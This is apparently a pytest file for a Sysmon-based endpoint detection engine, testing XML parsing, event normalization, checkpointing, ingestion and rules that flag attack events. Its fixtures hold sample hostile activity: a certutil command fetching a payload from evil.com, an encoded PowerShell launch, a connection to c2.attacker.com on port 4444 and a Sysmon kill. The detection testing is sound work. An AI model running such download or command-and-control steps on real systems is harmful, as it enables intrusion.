import os
import sys
import json
import pytest
import datetime
from unittest.mock import MagicMock, patch

# Ensure project root is in path
PROJECT_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if PROJECT_ROOT not in sys.path:
    sys.path.insert(0, PROJECT_ROOT)

from generator.models import LogEvent, LogType, SeverityLevel
from engine.detection_engine import DetectionEngine
from web.server import ingest_live_telemetry, IngestBatchRequest, resolve_log_type
from agent.sysmon_reader import (
    SysmonReader,
    SysmonCheckpointManager,
    parse_sysmon_xml,
    normalize_sysmon_event,
    SYSMON_CHANNEL
)
from agent.collector import EndpointCollectorAgent


# --- SAMPLE SYSMON XML FIXTURES ---

SAMPLE_EID1_XML = """<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}" />
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-10-30T16:10:00.1234567Z" />
    <EventRecordID>10001</EventRecordID>
    <Correlation />
    <Execution ProcessID="3420" ThreadID="4512" />
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>WIN-LAB-01</Computer>
    <Security UserID="S-1-5-18" />
  </System>
  <EventData>
    <Data Name="RuleName">-</Data>
    <Data Name="UtcTime">2026-10-30 16:10:00.120</Data>
    <Data Name="ProcessGuid">{A1B2C3D4-E5F6-7890-ABCD-EF1234567890}</Data>
    <Data Name="ProcessId">5840</Data>
    <Data Name="Image">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data>
    <Data Name="FileVersion">10.0.22621.1</Data>
    <Data Name="Description">Windows PowerShell</Data>
    <Data Name="Product">Microsoft® Windows® Operating System</Data>
    <Data Name="Company">Microsoft Corporation</Data>
    <Data Name="OriginalFileName">PowerShell.EXE</Data>
    <Data Name="CommandLine">powershell.exe -NoProfile -enc SQBFAFgA</Data>
    <Data Name="CurrentDirectory">C:\\Users\\analyst\\</Data>
    <Data Name="User">WIN-LAB-01\\analyst</Data>
    <Data Name="ParentProcessGuid">{B2C3D4E5-F6A7-8901-BCDE-F12345678901}</Data>
    <Data Name="ParentProcessId">4120</Data>
    <Data Name="ParentImage">C:\\Windows\\explorer.exe</Data>
    <Data Name="ParentCommandLine">C:\\Windows\\Explorer.EXE</Data>
    <Data Name="ParentUser">WIN-LAB-01\\analyst</Data>
  </EventData>
</Event>"""

SAMPLE_EID3_XML = """<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" />
    <EventID>3</EventID>
    <TimeCreated SystemTime="2026-10-30T16:11:00.000Z" />
    <EventRecordID>10002</EventRecordID>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>WIN-LAB-01</Computer>
  </System>
  <EventData>
    <Data Name="ProcessId">5840</Data>
    <Data Name="Image">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data>
    <Data Name="User">WIN-LAB-01\\analyst</Data>
    <Data Name="Protocol">tcp</Data>
    <Data Name="Initiated">true</Data>
    <Data Name="SourceIsIpv6">false</Data>
    <Data Name="SourceIp">192.168.1.150</Data>
    <Data Name="SourceHostname">WIN-LAB-01</Data>
    <Data Name="SourcePort">52410</Data>
    <Data Name="DestinationIsIpv6">false</Data>
    <Data Name="DestinationIp">198.51.100.25</Data>
    <Data Name="DestinationHostname">c2.attacker.com</Data>
    <Data Name="DestinationPort">4444</Data>
  </EventData>
</Event>"""

SAMPLE_EID5_XML = """<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" />
    <EventID>5</EventID>
    <TimeCreated SystemTime="2026-10-30T16:12:00.000Z" />
    <EventRecordID>10003</EventRecordID>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>WIN-LAB-01</Computer>
  </System>
  <EventData>
    <Data Name="ProcessGuid">{A1B2C3D4-E5F6-7890-ABCD-EF1234567890}</Data>
    <Data Name="ProcessId">1040</Data>
    <Data Name="Image">C:\\Windows\\Sysmon64.exe</Data>
    <Data Name="User">NT AUTHORITY\\SYSTEM</Data>
    <Data Name="UtcTime">2026-10-30 16:12:00.000</Data>
  </EventData>
</Event>"""

SAMPLE_EID22_XML = """<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" />
    <EventID>22</EventID>
    <TimeCreated SystemTime="2026-10-30T16:13:00.000Z" />
    <EventRecordID>10004</EventRecordID>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>WIN-LAB-01</Computer>
  </System>
  <EventData>
    <Data Name="ProcessId">3320</Data>
    <Data Name="ProcessGuid">{C3D4E5F6-A7B8-9012-CDEF-123456789012}</Data>
    <Data Name="QueryName">test-beacon.duckdns.org</Data>
    <Data Name="QueryStatus">0</Data>
    <Data Name="QueryResults">::ffff:198.51.100.50;</Data>
    <Data Name="Image">C:\\Windows\\System32\\cmd.exe</Data>
    <Data Name="User">WIN-LAB-01\\analyst</Data>
  </EventData>
</Event>"""


# --- TEST CASES (1 to 18) ---

def test_sysmon_xml_parsing():
    """Requirement 1: Sysmon XML parsing."""
    combined_xml = f"<Events>{SAMPLE_EID1_XML}{SAMPLE_EID3_XML}{SAMPLE_EID5_XML}{SAMPLE_EID22_XML}</Events>"
    parsed_events = parse_sysmon_xml(combined_xml)
    assert len(parsed_events) == 4
    assert parsed_events[0]["EventID"] == 1
    assert parsed_events[0]["EventRecordID"] == 10001
    assert parsed_events[0]["Computer"] == "WIN-LAB-01"
    assert parsed_events[0]["ProcessId"] == 5840
    assert "powershell.exe" in parsed_events[0]["Image"]
    assert "SQBFAFgA" in parsed_events[0]["CommandLine"]
    assert parsed_events[0]["ParentProcessId"] == 4120


def test_event_id_1_normalization():
    """Requirement 2: Event ID 1 normalization."""
    parsed = parse_sysmon_xml(SAMPLE_EID1_XML)
    assert len(parsed) == 1
    evt = normalize_sysmon_event(parsed[0])

    assert evt["event_id"] == "SYSMON_PROCESS_CREATE"
    assert evt["log_type"] == "windows.sysmon"
    assert evt["hostname"] == "WIN-LAB-01"
    assert evt["user"] == "WIN-LAB-01\\analyst"
    assert evt["process_name"] == "powershell.exe"
    assert evt["process_id"] == 5840
    assert evt["parent_process_name"] == "explorer.exe"
    assert evt["command_line"] == "powershell.exe -NoProfile -enc SQBFAFgA"
    assert evt["telemetry_source"] == "live"
    assert evt["ground_truth"] is None
    assert "Sysmon EID 1 (ProcessCreate)" in evt["raw_message"]
    assert evt["details"]["EventRecordID"] == 10001
    assert evt["details"]["sysmon_event_id"] == 1


def test_event_id_3_normalization():
    """Requirement 3: Event ID 3 normalization."""
    parsed = parse_sysmon_xml(SAMPLE_EID3_XML)
    assert len(parsed) == 1
    evt = normalize_sysmon_event(parsed[0])

    assert evt["event_id"] == "SYSMON_NETWORK_CONNECT"
    assert evt["log_type"] == "windows.sysmon"
    assert evt["process_name"] == "powershell.exe"
    assert evt["source_ip"] == "192.168.1.150"
    assert evt["details"]["SourcePort"] == 52410
    assert evt["details"]["DestinationIp"] == "198.51.100.25"
    assert evt["details"]["DestinationPort"] == 4444
    assert evt["details"]["Protocol"] == "tcp"
    assert "Sysmon EID 3 (NetworkConnect)" in evt["raw_message"]


def test_event_id_5_normalization():
    """Requirement 4: Event ID 5 normalization."""
    parsed = parse_sysmon_xml(SAMPLE_EID5_XML)
    assert len(parsed) == 1
    evt = normalize_sysmon_event(parsed[0])

    assert evt["event_id"] == "SYSMON_PROCESS_TERMINATE"
    assert evt["log_type"] == "windows.sysmon"
    assert evt["process_name"] == "Sysmon64.exe"
    assert evt["process_id"] == 1040
    assert evt["user"] == "NT AUTHORITY\\SYSTEM"
    assert "Sysmon EID 5 (ProcessTerminate)" in evt["raw_message"]


def test_event_id_22_normalization():
    """Requirement 5: Event ID 22 normalization."""
    parsed = parse_sysmon_xml(SAMPLE_EID22_XML)
    assert len(parsed) == 1
    evt = normalize_sysmon_event(parsed[0])

    assert evt["event_id"] == "SYSMON_DNS_QUERY"
    assert evt["log_type"] == "windows.sysmon"
    assert evt["process_name"] == "cmd.exe"
    assert evt["details"]["QueryName"] == "test-beacon.duckdns.org"
    assert evt["details"]["QueryStatus"] == "0"
    assert "duckdns.org" in evt["raw_message"]


def test_missing_xml_fields():
    """Requirement 6: Missing XML fields handled safely without crashing."""
    sparse_xml = """<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
      <System>
        <EventID>1</EventID>
        <EventRecordID>10099</EventRecordID>
      </System>
      <EventData>
        <Data Name="Image"></Data>
      </EventData>
    </Event>"""
    parsed = parse_sysmon_xml(sparse_xml)
    assert len(parsed) == 1
    evt = normalize_sysmon_event(parsed[0])
    assert evt["event_id"] == "SYSMON_PROCESS_CREATE"
    assert evt["process_name"] is None
    assert evt["command_line"] is None
    assert evt["user"] is None
    assert evt["process_id"] is None
    assert evt["details"]["EventRecordID"] == 10099


def test_invalid_event_xml():
    """Requirement 7: Invalid or corrupted event XML returns empty without crashing."""
    assert parse_sysmon_xml("") == []
    assert parse_sysmon_xml("   ") == []
    assert parse_sysmon_xml("<Event><System><EventID>broken") == []
    assert parse_sysmon_xml("Not even XML at all") == []


def test_stable_event_ids():
    """Requirement 8: Stable deterministic event IDs."""
    parsed1 = parse_sysmon_xml(SAMPLE_EID1_XML)[0]
    evt1 = normalize_sysmon_event(parsed1)
    parsed2 = parse_sysmon_xml(SAMPLE_EID1_XML)[0]
    evt2 = normalize_sysmon_event(parsed2)

    assert evt1["id"] == "sysmon-win-lab-01-10001"
    assert evt1["id"] == evt2["id"]


def test_checkpoint_persistence(tmp_path):
    """Requirement 9: Checkpoint persistence using atomic write strategy."""
    ckpt_file = str(tmp_path / "sysmon_test_ckpt.json")
    mgr = SysmonCheckpointManager(checkpoint_path=ckpt_file, hostname="WIN-TEST", channel=SYSMON_CHANNEL)
    assert mgr.last_record_id == 0

    success = mgr.commit(10540, timestamp="2026-10-30T16:00:00Z")
    assert success is True
    assert mgr.last_record_id == 10540

    # Verify written JSON
    assert os.path.exists(ckpt_file)
    with open(ckpt_file, "r", encoding="utf-8") as f:
        data = json.load(f)
    assert data["last_record_id"] == 10540
    assert data["hostname"] == "WIN-TEST"
    assert data["channel"] == SYSMON_CHANNEL


def test_duplicate_prevention(tmp_path):
    """Requirement 10: Duplicate prevention."""
    ckpt_file = str(tmp_path / "sysmon_dedup_ckpt.json")
    reader = SysmonReader(
        checkpoint_file=ckpt_file,
        mock_event_xmls=[SAMPLE_EID1_XML, SAMPLE_EID3_XML]
    )
    # First read
    events, pending_id = reader.read_events()
    assert len(events) == 2
    assert pending_id == 10002

    # Commit checkpoint
    reader.commit_checkpoint(pending_id)

    # Second read with same events: must return 0 duplicates
    events_again, _ = reader.read_events()
    assert len(events_again) == 0


def test_restart_recovery(tmp_path):
    """Requirement 11: Restart recovery."""
    ckpt_file = str(tmp_path / "sysmon_restart_ckpt.json")
    # Agent session 1
    reader1 = SysmonReader(checkpoint_file=ckpt_file, mock_event_xmls=[SAMPLE_EID1_XML])
    events1, pending1 = reader1.read_events()
    assert len(events1) == 1
    reader1.commit_checkpoint(pending1)

    # Agent session 2 (restarted agent)
    reader2 = SysmonReader(
        checkpoint_file=ckpt_file,
        mock_event_xmls=[SAMPLE_EID1_XML, SAMPLE_EID3_XML]
    )
    assert reader2.checkpoint.last_record_id == 10001
    events2, pending2 = reader2.read_events()
    # Event 10001 must be skipped; only Event 10002 returned
    assert len(events2) == 1
    assert events2[0]["details"]["EventRecordID"] == 10002


def test_failed_api_ingestion(tmp_path, monkeypatch):
    """Requirement 12: Failed API ingestion retains events and does not advance checkpoint."""
    ckpt_file = str(tmp_path / "sysmon_fail_ckpt.json")
    reader = SysmonReader(checkpoint_file=ckpt_file, mock_event_xmls=[SAMPLE_EID1_XML])

    agent = EndpointCollectorAgent(server_url="http://127.0.0.1:9999", enable_sysmon=False)
    agent.sysmon_reader = reader

    # Mock send_telemetry_batch to simulate HTTP failure (returns False)
    monkeypatch.setattr(agent, "send_telemetry_batch", lambda events: False)

    # Run single cycle
    agent.start_collecting(run_once=True)

    # Checkpoint must NOT advance
    assert reader.checkpoint.last_record_id == 0
    # Unacknowledged events must be in retry buffer
    assert len(agent.retry_buffer) > 0


def test_successful_api_ingestion(tmp_path, monkeypatch):
    """Requirement 13: Successful API ingestion advances checkpoint and clears retry buffer."""
    ckpt_file = str(tmp_path / "sysmon_success_ckpt.json")
    reader = SysmonReader(checkpoint_file=ckpt_file, mock_event_xmls=[SAMPLE_EID1_XML])

    agent = EndpointCollectorAgent(server_url="http://127.0.0.1:8000", enable_sysmon=False)
    agent.sysmon_reader = reader

    # Mock send_telemetry_batch to simulate HTTP 200 success
    monkeypatch.setattr(agent, "send_telemetry_batch", lambda events: True)

    agent.start_collecting(run_once=True)

    # Checkpoint MUST advance to 10001
    assert reader.checkpoint.last_record_id == 10001
    assert len(agent.retry_buffer) == 0


def test_windows_only_safely_disabled_on_linux(monkeypatch):
    """Requirement 14: Windows-only functionality safely disabled on Linux."""
    monkeypatch.setattr(sys, "platform", "linux")
    assert SysmonReader.is_supported() is False

    agent = EndpointCollectorAgent(enable_sysmon=True)
    assert agent.sysmon_reader is None


def test_new_detection_rules_matching():
    """Requirement 15: New detection rules match appropriate attack events."""
    rules_dir = os.path.join(PROJECT_ROOT, "rules")
    engine = DetectionEngine(rules_dir=rules_dir)

    # 1. Rule RULE-WIN-001 (PowerShell Encoded Command)
    eid1_norm = normalize_sysmon_event(parse_sysmon_xml(SAMPLE_EID1_XML)[0])
    eid1_event = LogEvent(**eid1_norm)
    alerts1 = engine.process_event(eid1_event, bypass_cooldown=True)
    matched_win1 = [a for a in alerts1 if a.rule_id == "RULE-WIN-001"]
    assert len(matched_win1) == 1
    assert matched_win1[0].severity == SeverityLevel.HIGH
    assert matched_win1[0].mitre_technique_id == "T1059.001"

    # 2. Rule RULE-WIN-002 (LOLBin certutil script execution)
    xml_certutil = """<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
      <System><EventID>1</EventID><EventRecordID>10050</EventRecordID><Computer>WIN-LAB-01</Computer></System>
      <EventData>
        <Data Name="Image">C:\\Windows\\System32\\certutil.exe</Data>
        <Data Name="CommandLine">certutil.exe -urlcache -split -f http://evil.com/payload.exe</Data>
        <Data Name="ProcessId">6120</Data>
      </EventData>
    </Event>"""
    evt_certutil = LogEvent(**normalize_sysmon_event(parse_sysmon_xml(xml_certutil)[0]))
    alerts2 = engine.process_event(evt_certutil, bypass_cooldown=True)
    matched_win2 = [a for a in alerts2 if a.rule_id == "RULE-WIN-002"]
    assert len(matched_win2) == 1
    assert matched_win2[0].mitre_technique_id == "T1218"

    # 3. Rule RULE-WIN-003 (Suspicious Outbound Network Connect)
    eid3_norm = normalize_sysmon_event(parse_sysmon_xml(SAMPLE_EID3_XML)[0])
    eid3_event = LogEvent(**eid3_norm)
    alerts3 = engine.process_event(eid3_event, bypass_cooldown=True)
    matched_win3 = [a for a in alerts3 if a.rule_id == "RULE-WIN-003"]
    assert len(matched_win3) == 1
    assert matched_win3[0].mitre_technique_id == "T1071.001"

    # 4. Rule RULE-WIN-004 (DNS Anomaly Query)
    eid22_norm = normalize_sysmon_event(parse_sysmon_xml(SAMPLE_EID22_XML)[0])
    eid22_event = LogEvent(**eid22_norm)
    alerts4 = engine.process_event(eid22_event, bypass_cooldown=True)
    matched_win4 = [a for a in alerts4 if a.rule_id == "RULE-WIN-004"]
    assert len(matched_win4) == 1
    assert matched_win4[0].mitre_technique_id == "T1071.004"

    # 5. Rule RULE-WIN-005 (Security Process Termination)
    eid5_norm = normalize_sysmon_event(parse_sysmon_xml(SAMPLE_EID5_XML)[0])
    eid5_event = LogEvent(**eid5_norm)
    alerts5 = engine.process_event(eid5_event, bypass_cooldown=True)
    matched_win5 = [a for a in alerts5 if a.rule_id == "RULE-WIN-005"]
    assert len(matched_win5) == 1
    assert matched_win5[0].severity == SeverityLevel.CRITICAL
    assert matched_win5[0].mitre_technique_id == "T1562.001"


def test_benign_events_no_false_positives():
    """Requirement 16: Benign events do not trigger false alerts."""
    rules_dir = os.path.join(PROJECT_ROOT, "rules")
    engine = DetectionEngine(rules_dir=rules_dir)

    # Benign Process Create (Notepad)
    xml_benign_proc = """<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
      <System><EventID>1</EventID><EventRecordID>20001</EventRecordID><Computer>WIN-LAB-01</Computer></System>
      <EventData>
        <Data Name="Image">C:\\Windows\\notepad.exe</Data>
        <Data Name="CommandLine">notepad.exe notes.txt</Data>
        <Data Name="ProcessId">2100</Data>
      </EventData>
    </Event>"""
    evt_benign_proc = LogEvent(**normalize_sysmon_event(parse_sysmon_xml(xml_benign_proc)[0]))
    assert len(engine.process_event(evt_benign_proc, bypass_cooldown=True)) == 0

    # Benign Chrome Outbound HTTPS (Port 443)
    xml_benign_net = """<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
      <System><EventID>3</EventID><EventRecordID>20002</EventRecordID><Computer>WIN-LAB-01</Computer></System>
      <EventData>
        <Data Name="Image">C:\\Program Files\\Google\\Chrome\\chrome.exe</Data>
        <Data Name="ProcessId">3300</Data>
        <Data Name="DestinationPort">443</Data>
        <Data Name="DestinationIp">142.250.190.46</Data>
      </EventData>
    </Event>"""
    evt_benign_net = LogEvent(**normalize_sysmon_event(parse_sysmon_xml(xml_benign_net)[0]))
    assert len(engine.process_event(evt_benign_net, bypass_cooldown=True)) == 0

    # Benign DNS Query (google.com)
    xml_benign_dns = """<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
      <System><EventID>22</EventID><EventRecordID>20003</EventRecordID><Computer>WIN-LAB-01</Computer></System>
      <EventData>
        <Data Name="Image">C:\\Program Files\\Google\\Chrome\\chrome.exe</Data>
        <Data Name="QueryName">www.google.com</Data>
        <Data Name="QueryStatus">0</Data>
      </EventData>
    </Event>"""
    evt_benign_dns = LogEvent(**normalize_sysmon_event(parse_sysmon_xml(xml_benign_dns)[0]))
    assert len(engine.process_event(evt_benign_dns, bypass_cooldown=True)) == 0

    # Benign Process Terminate (calc.exe)
    xml_benign_term = """<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
      <System><EventID>5</EventID><EventRecordID>20004</EventRecordID><Computer>WIN-LAB-01</Computer></System>
      <EventData>
        <Data Name="Image">C:\\Windows\\calc.exe</Data>
        <Data Name="ProcessId">4400</Data>
      </EventData>
    </Event>"""
    evt_benign_term = LogEvent(**normalize_sysmon_event(parse_sysmon_xml(xml_benign_term)[0]))
    assert len(engine.process_event(evt_benign_term, bypass_cooldown=True)) == 0


def test_existing_api_ingestion_compatibility():
    """Requirement 17: Existing API ingestion compatibility with windows.sysmon."""
    payload = IngestBatchRequest(
        agent_id="test-sysmon-agent",
        hostname="win-endpoint-01",
        events=[
            normalize_sysmon_event(parse_sysmon_xml(SAMPLE_EID1_XML)[0]),
            normalize_sysmon_event(parse_sysmon_xml(SAMPLE_EID3_XML)[0])
        ]
    )
    res = ingest_live_telemetry(payload)
    assert res["status"] == "success"
    assert res["ingested_count"] == 2
    assert resolve_log_type("windows.sysmon") == LogType.WINDOWS_SYSMON


def test_existing_synthetic_detection_tests_remain_functional():
    """Requirement 18: Existing detection and export features remain 100% operational."""
    rules_dir = os.path.join(PROJECT_ROOT, "rules")
    engine = DetectionEngine(rules_dir=rules_dir)
    assert len(engine.rules) >= 16
